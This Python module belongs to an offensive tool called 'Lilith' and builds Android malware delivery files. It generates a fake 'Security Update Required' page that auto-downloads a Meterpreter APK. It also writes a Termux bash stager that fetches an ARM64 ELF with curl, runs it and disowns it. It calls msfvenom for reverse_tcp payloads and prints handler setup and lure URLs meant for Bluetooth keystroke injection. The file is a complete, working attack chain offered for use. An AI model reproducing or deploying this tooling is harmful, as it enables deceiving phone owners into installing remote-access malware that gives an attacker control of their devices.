"""
Lilith — Android payload delivery (server-side)

Two modes:

  chrome / apk  —  Serve a mobile landing page that auto-downloads an MSF APK.
                   BLE HID navigates Chrome to the page; user has to tap through
                   the "Install unknown apps" prompt once, then tap Install.
                   Min interaction: ~4 taps after the APK downloads.

  termux        —  Serve a bash stager that downloads an ARM64 ELF and runs it.
                   BLE HID opens Termux and types the curl command; zero UI friction
                   beyond what the keyboard already did. Requires Termux installed.

Files written to output_dir (served by 'lilith serve'):
  android/
    index.html   — mobile APK lure page           (chrome mode)
    agent.apk    — placeholder (generate with msfvenom, drop here manually)
    run.sh       — Termux bash stager             (termux mode)
    stager.elf   — placeholder (generate with msfvenom, drop here manually)

Generate payloads (printed during build):
  APK  : msfvenom -p android/meterpreter/reverse_tcp LHOST=X LPORT=Y -o android/agent.apk
  ELF  : msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f elf -o android/stager.elf
  ARM32: msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=X LPORT=Y -f elf -o android/stager.elf

MSF handler:
  use exploit/multi/handler
  set payload android/meterpreter/reverse_tcp   # for APK
  set payload linux/aarch64/meterpreter/reverse_tcp  # for ELF
  set LHOST X
  set LPORT Y
  set ExitOnSession false
  run -j
"""

import os
import shutil
import subprocess


def _try_msfvenom(payload: str, lhost: str, lport: int,
                  fmt: str | None, out_path: str) -> tuple[bool, str]:
    """Attempt to run msfvenom; return (success, message).

    fmt=None skips the -f flag (required for Android APK payloads which
    determine output format from the payload type, not a format string).
    """
    msf = shutil.which("msfvenom")
    if not msf:
        return False, "msfvenom not found in PATH"
    cmd = [msf, "-p", payload,
           f"LHOST={lhost}", f"LPORT={lport}"]
    if fmt:
        cmd += ["-f", fmt]
    cmd += ["-o", out_path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        if r.returncode == 0 and os.path.exists(out_path) and os.path.getsize(out_path) > 0:
            return True, out_path
        err = (r.stderr or r.stdout or "unknown error").strip()
        return False, err
    except subprocess.TimeoutExpired:
        return False, "msfvenom timed out (>180s)"
    except Exception as e:
        return False, str(e)


_ANDROID_ICON = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="56" height="56" viewBox="0 0 24 24">'
    '<path d="M17.523 15.341l1.2-2.078a.25.25 0 0 0-.09-.34l-1.22-.704a5.1 5.1 0 0 0 .23-1.52'
    ' 5.1 5.1 0 0 0-.23-1.52l1.22-.703a.25.25 0 0 0 .09-.34l-1.2-2.079a.25.25 0 0 0-.34-.09'
    'l-1.22.704a5.49 5.49 0 0 0-2.664-1.54V3.75a.25.25 0 0 0-.25-.25h-2.4a.25.25 0 0 0-.25.25'
    'v1.28a5.49 5.49 0 0 0-2.664 1.54l-1.22-.704a.25.25 0 0 0-.34.09L4.78 8.035a.25.25 0 0 0'
    ' .09.34l1.22.703a5.1 5.1 0 0 0-.23 1.52 5.1 5.1 0 0 0 .23 1.52l-1.22.704a.25.25 0 0 0'
    '-.09.34l1.2 2.078a.25.25 0 0 0 .34.09l1.22-.703a5.49 5.49 0 0 0 2.664 1.54v1.28a.25.25'
    ' 0 0 0 .25.25h2.4a.25.25 0 0 0 .25-.25v-1.28a5.49 5.49 0 0 0 2.664-1.54l1.22.703a.25.25'
    ' 0 0 0 .34-.09zM12 13.5a2.9 2.9 0 1 1 0-5.8 2.9 2.9 0 0 1 0 5.8z" fill="#78c257"/>'
    '</svg>'
)


def _apk_lure_html(lhost: str, port: int, apk_name: str = "agent.apk") -> str:
    apk_url = f"https://{lhost}:{port}/android/{apk_name}"
    return f"""\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>App Update Required</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Roboto',sans-serif;background:#f5f5f5;
     display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;border-radius:8px;padding:32px 24px;max-width:380px;
       width:calc(100%-32px);box-shadow:0 2px 8px rgba(0,0,0,.15);text-align:center}}
.icon{{margin-bottom:20px}}
h1{{font-size:18px;font-weight:500;color:#212121;margin-bottom:8px}}
p{{color:#616161;font-size:13px;margin-bottom:24px;line-height:1.6}}
.btn{{display:block;background:#4caf50;color:#fff;padding:14px;border-radius:4px;
      text-decoration:none;font-size:15px;font-weight:500;margin-bottom:20px}}
.steps{{text-align:left;background:#f9f9f9;border-radius:4px;padding:14px 16px;
        font-size:12px;color:#424242;line-height:2}}
.steps b{{color:#212121}}
.note{{font-size:11px;color:#aaa;margin-top:12px}}
</style>
</head>
<body>
<div class="card">
  <div class="icon">{_ANDROID_ICON}</div>
  <h1>Security Update Required</h1>
  <p>A mandatory security update is available for your device. Install now to stay protected.</p>
  <a class="btn" href="{apk_url}" id="dl">Download Update</a>
  <div class="steps">
    After download:
    <br><b>1.</b> Tap the download notification
    <br><b>2.</b> Tap <b>Settings</b> → enable <b>Install unknown apps</b>
    <br><b>3.</b> Tap <b>Install</b>
  </div>
  <div class="note">v2.4.1 &nbsp;&bull;&nbsp; {apk_name}</div>
</div>
<script>
window.addEventListener('load',function(){{
  document.getElementById('dl').click();
}});
</script>
</body>
</html>"""


def _termux_stager_sh(lhost: str, port: int, elf_name: str = "stager.elf") -> str:
    elf_url = f"https://{lhost}:{port}/android/{elf_name}"
    return (
        "#!/data/data/com.termux/files/usr/bin/bash\n"
        f"_f=$(mktemp -p $HOME .p.XXXXXX)\n"
        f"curl -sk '{elf_url}' -o \"$_f\" && chmod +x \"$_f\" && \"$_f\" &\n"
        "disown\n"
    )


def build_android_payload(
    lhost:      str,
    port:       int,
    lport:      int,
    output_dir: str,
    mode:       str = "chrome",
    apk_name:   str = "agent.apk",
    elf_name:   str = "stager.elf",
) -> bool:
    """Generate Android delivery files served by 'lilith serve'.

    mode='chrome'  → mobile APK lure page (index.html) + placeholder for agent.apk
    mode='termux'  → bash stager (run.sh) + placeholder for stager.elf
    mode='both'    → all of the above
    """
    os.makedirs(output_dir, exist_ok=True)

    wrote = []

    if mode in ("chrome", "both"):
        html = _apk_lure_html(lhost, port, apk_name)
        html_path = os.path.join(output_dir, "index.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html)
        wrote.append(("index.html", html_path))

        apk_path = os.path.join(output_dir, apk_name)
        if not os.path.exists(apk_path):
            ok, msg = _try_msfvenom(
                "android/meterpreter/reverse_tcp", lhost, lport, None, apk_path)
            if ok:
                wrote.append((apk_name, apk_path, f"msfvenom APK  ({os.path.getsize(apk_path):,} bytes)"))
            else:
                with open(apk_path, "wb") as f:
                    f.write(b"# generate with msfvenom and replace this file\n")
                wrote.append((apk_name, apk_path, f"PLACEHOLDER — msfvenom unavailable: {msg}"))

    if mode in ("termux", "both"):
        sh = _termux_stager_sh(lhost, port, elf_name)
        sh_path = os.path.join(output_dir, "run.sh")
        with open(sh_path, "w", encoding="utf-8") as f:
            f.write(sh)
        wrote.append(("run.sh", sh_path))

        elf_path = os.path.join(output_dir, elf_name)
        if not os.path.exists(elf_path):
            ok, msg = _try_msfvenom(
                "linux/aarch64/meterpreter/reverse_tcp", lhost, lport, "elf", elf_path)
            if ok:
                wrote.append((elf_name, elf_path, f"msfvenom ELF ARM64  ({os.path.getsize(elf_path):,} bytes)"))
            else:
                with open(elf_path, "wb") as f:
                    f.write(b"")
                wrote.append((elf_name, elf_path, f"PLACEHOLDER — msfvenom unavailable: {msg}"))

    print()
    for entry in wrote:
        if len(entry) == 3:
            print(f"[+] {entry[1]}  [{entry[2]}]")
        else:
            print(f"[+] {entry[1]}")

    print()
    print(f"[*] Generate payloads and drop them in {output_dir}/:")
    if mode in ("chrome", "both"):
        print(f"    APK:")
        print(f"      msfvenom -p android/meterpreter/reverse_tcp \\")
        print(f"               LHOST={lhost} LPORT={lport} -o {output_dir}/{apk_name}")
        print()
    if mode in ("termux", "both"):
        print(f"    ELF ARM64 (modern devices):")
        print(f"      msfvenom -p linux/aarch64/meterpreter/reverse_tcp \\")
        print(f"               LHOST={lhost} LPORT={lport} -f elf -o {output_dir}/{elf_name}")
        print(f"    ELF ARMv7 (32-bit fallback):")
        print(f"      msfvenom -p linux/armle/meterpreter/reverse_tcp \\")
        print(f"               LHOST={lhost} LPORT={lport} -f elf -o {output_dir}/{elf_name}")
        print()
    print(f"[*] MSF handler:")
    payload = "android/meterpreter/reverse_tcp" if mode in ("chrome", "both") else "linux/aarch64/meterpreter/reverse_tcp"
    print(f"      use exploit/multi/handler")
    print(f"      set payload {payload}")
    print(f"      set LHOST {lhost}")
    print(f"      set LPORT {lport}")
    print(f"      set ExitOnSession false")
    print(f"      run -j")
    print()
    if mode in ("chrome", "both"):
        print(f"[*] Lure URL (BLE keystroke target):")
        print(f"    https://{lhost}:{port}/android/")
        print(f"    Chrome: cert warning → tap 'Advanced' → 'Proceed' (self-signed)")
    if mode in ("termux", "both"):
        print(f"[*] Termux curl target:")
        print(f"    https://{lhost}:{port}/android/run.sh  (-sk bypasses cert)")

    return True
